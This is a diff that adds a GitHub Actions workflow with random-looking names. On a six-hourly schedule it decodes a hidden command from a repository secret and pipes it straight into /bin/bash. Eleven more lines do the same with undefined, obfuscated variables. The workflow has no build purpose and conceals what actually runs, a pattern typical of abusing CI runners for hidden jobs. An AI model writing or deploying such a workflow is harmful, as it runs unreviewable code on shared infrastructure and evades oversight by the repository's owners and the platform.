@@ -1,0 +1,29 @@
+name: tongyangdeliziruci
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongyangdeliziruci
+        env:
+          lxta7352: ${{ secrets.lxta7352 }}
+        run: |
+          echo $lxta7352 | jq -r .sokrz52543 | /bin/bash
+          echo $dn854 | jq -r .x7 | /bin/bash
+          echo $fa894 | jq -r .xi4101 | /bin/bash
+          echo $pbwo08185 | jq -r .wg9 | /bin/bash
+          echo $utmpb3519 | jq -r .k492 | /bin/bash
+          echo $pk34 | jq -r .fgtcn76 | /bin/bash
+          echo $aa62168 | jq -r .f69367 | /bin/bash
+          echo $b1 | jq -r .hdt4 | /bin/bash
+          echo $x989 | jq -r .kepu8 | /bin/bash
+          echo $skvrj46 | jq -r .iwoix0526 | /bin/bash
+          echo $ntaae0 | jq -r .mydcz9828 | /bin/bash
+          echo $ud71834 | jq -r .pfxxh904 | /bin/bash
+
